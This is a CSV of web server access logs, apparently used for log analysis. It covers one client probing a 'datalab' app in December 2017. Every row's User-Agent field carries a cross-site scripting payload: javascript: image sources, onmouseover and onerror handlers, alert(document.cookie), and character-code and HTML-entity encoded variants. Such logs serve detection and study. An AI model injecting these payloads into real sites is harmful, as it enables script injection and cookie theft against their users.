"","X1","X2","X3","X4","X5","X6","X7","X8","X9","X10"
"76","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:45:28 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <IMG SRC=javascript:alert(""XSS"")> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","224"
"77","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:45:28 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=javascript:alert(""XSS"")> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"78","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:45:28 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=javascript:alert(""XSS"")> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","24"
"79","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:45:45 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","8"
"80","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:45:45 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"81","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:45:45 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"82","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:47:45 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"83","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:49:46 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"84","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:02 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","76"
"85","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:02 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","41"
"86","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:02 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","172"
"87","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:03 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","204"
"88","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:03 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"89","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:03 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","8"
"90","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:27 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <a onmouseover=alert(document.cookie)>xxs link</a> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","5"
"91","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:27 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <a onmouseover=alert(document.cookie)>xxs link</a> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","6"
"92","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:27 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <a onmouseover=alert(document.cookie)>xxs link</a> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"93","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:28 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <a onmouseover=alert(document.cookie)>xxs link</a> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","284"
"94","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:28 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <a onmouseover=alert(document.cookie)>xxs link</a> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","33"
"95","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:28 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <a onmouseover=alert(document.cookie)>xxs link</a> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","37"
"96","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:44 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","221"
"97","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:44 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","97"
"98","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:44 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","74"
"99","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:45 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","133"
"100","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:45 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"101","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:50:45 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"102","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:51:05 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","34"
"103","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:51:05 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"104","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:51:05 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"105","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:51:06 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","166"
"106","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:51:06 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"107","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:51:06 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","14"
"108","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:51:26 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC=# onmouseover=""alert('xxs')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","43"
"109","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:51:27 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC=# onmouseover=""alert('xxs')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","99"
"110","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:51:27 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC=# onmouseover=""alert('xxs')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","14"
"111","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:53:27 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=# onmouseover=""alert('xxs')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"112","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:55:27 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=# onmouseover=""alert('xxs')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"113","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:55:41 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC= onmouseover=""alert('xxs')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","39"
"114","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:55:41 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC= onmouseover=""alert('xxs')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","7"
"115","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:55:42 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC= onmouseover=""alert('xxs')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","10"
"116","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:57:41 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC= onmouseover=""alert('xxs')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"117","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:59:42 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG SRC= onmouseover=""alert('xxs')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"118","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:59:57 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG onmouseover=""alert('xxs')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","14"
"119","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:59:57 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG onmouseover=""alert('xxs')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"120","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:13:59:58 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG onmouseover=""alert('xxs')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"121","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:01:57 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG onmouseover=""alert('xxs')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"122","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:03:58 +0000","POST /datalab HTTP/1.1",NA,NA,"http://31.14.135.81:3000/","datalab <IMG onmouseover=""alert('xxs')""> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",NA
"123","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:14 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","35"
"124","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:15 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","55"
"125","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:15 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","4"
"126","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:15 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","171"
"127","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:16 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"128","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:16 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","12"
"129","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:41 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","62"
"130","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:41 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","40"
"131","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:41 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","11"
"132","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:42 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","167"
"133","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:42 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","2"
"134","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:42 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","3"
"135","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:57 +0000","GET / HTTP/1.1",200,1040,NA,"datalab &#39;&#88;&#83;&#83;&#39;&#41;> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","5"
"136","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:57 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab &#39;&#88;&#83;&#83;&#39;&#41;> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","7"
"137","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:57 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab &#39;&#88;&#83;&#83;&#39;&#41;> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","5"
"138","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:58 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab &#39;&#88;&#83;&#83;&#39;&#41;> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","147"
"139","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:58 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab &#39;&#88;&#83;&#83;&#39;&#41;> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","1"
"140","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:04:58 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab &#39;&#88;&#83;&#83;&#39;&#41;> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","0"
"141","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:05:17 +0000","GET / HTTP/1.1",200,1040,NA,"datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","159"
"142","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:05:17 +0000","GET /css/index.css HTTP/1.1",200,945,"http://31.14.135.81:3000/","datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","29"
"143","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:05:17 +0000","GET /img/logo.png HTTP/1.1",200,34463,"http://31.14.135.81:3000/","datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","65"
"144","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:05:18 +0000","POST /datalab HTTP/1.1",200,1073,"http://31.14.135.81:3000/","datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","556"
"145","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:05:19 +0000","GET /css/index.css HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","15"
"146","::ffff:192.108.116.88",NA,NA,"18/Dec/2017:14:05:19 +0000","GET /img/logo.png HTTP/1.1",304,NA,"http://31.14.135.81:3000/","datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36","44"
